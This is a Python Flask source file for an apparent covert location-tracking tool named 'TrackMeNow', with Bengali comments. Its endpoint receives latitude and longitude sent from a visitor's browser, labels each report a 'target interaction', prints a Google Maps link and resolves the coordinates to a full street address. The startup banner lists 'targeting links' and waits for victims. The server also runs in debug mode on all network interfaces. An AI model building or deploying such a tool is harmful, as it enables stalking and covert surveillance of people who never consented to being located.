import os
import subprocess
from flask import Flask, render_template, request, jsonify
from geopy.geocoders import Nominatim

app = Flask(__name__)

# Geopy OSINT Module Configuration
geolocator = Nominatim(user_agent="TrackMeNow_OSINT_Engine")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/update_location', methods=['POST'])
def update_location():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No data received"}), 400

        latitude = data.get('latitude')
        longitude = data.get('longitude')

        if latitude and longitude:
            # আপনার আগের সেই কাস্টম লাইভ লগিং স্টাইল
            print("\n" + "="*50)
            print(f"[+] TARGET INTERACTION DETECTED!")
            print(f"[*] Latitude  : {latitude}")
            print(f"[*] Longitude : {longitude}")
            print(f"[*] Maps Link : https://maps.google.com/?q={latitude},{longitude}")
            
            # Geopy ব্যবহার করে ফুল অ্যাড্রেস বের করা
            try:
                location = geolocator.reverse((latitude, longitude), timeout=10)
                if location:
                    print(f"[+] Full Address: {location.address}")
                else:
                    print("[-] Address: Unable to resolve street name.")
            except Exception as geo_err:
                print(f"[-] Geocoding Error: {str(geo_err)}")
            print("="*50 + "\n")
            
            return jsonify({"status": "success", "message": "Payload delivered"}), 200
        else:
            return jsonify({"status": "error", "message": "Missing coordinates"}), 400

    except Exception as e:
        print(f"[-] Server Error: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500

def check_and_generate_certificates():
    cert_path = "cert.pem"
    key_path = "key.pem"
    script_path = "./generate_cert.sh"

    if not os.path.exists(cert_path) or not os.path.exists(key_path):
        if os.path.exists(script_path):
            try:
                subprocess.run(["chmod", "+x", script_path], check=True)
                subprocess.run([script_path], check=True)
            except Exception:
                pass
    return os.path.exists(cert_path) and os.path.exists(key_path)

if __name__ == '__main__':
    # আপনার সেই আসল ওল্ড স্কুলের হ্যাকিং ব্যানার ইন্টারফেস
    print("\033[92m" + "="*50)
    print("""
  _____ ____    _    ____ _  ____  _____ _   _   _    _ 
 |_   _|  _ \  / \  / ___| |/ /  \/  | ____| \ | |/ \  / |
   | | | |_) |/ _ \| |   | ' /| |\/| |  _| |  \| / _ \ | |
   | | |  _ </ ___ \ |___| . \| |  | | |___| |\  / ___ \| |
   |_| |_| \_/_/   \_\____|_|\_\_|  |_|_____|_| \_/_/   \_\_|
    """)
    print(" [*] Secure OSINT Location Tracking Engine v1.0.2 [*]")
    print("="*50 + "\033[0m")
    
    has_certs = check_and_generate_certificates()
    
    print("\033[94m[*] Initializing SSL/TLS Layer with self-signed certificates...")
    print("[+] Framework status: ACTIVE and Listening for incoming payloads...\033[0m")
    print("\n\033[93m===========[ TARGETING LINKS ]===========\033[0m")
    print(" LOCAL LOOPBACK : https://127.0.0.1:5000")
    print(" LAN CAPTURE IP : https://100.73.179.109:5000")
    print("\033[93m=========================================\033[0m")
    print("\n[*] Awaiting target interaction. Live logs will stream below...\n")

    # Dual HTTP/HTTPS automatic fallback configuration
    app.run(
        host='0.0.0.0', 
        port=5000, 
        debug=True,
        load_dotenv=False
    )
    
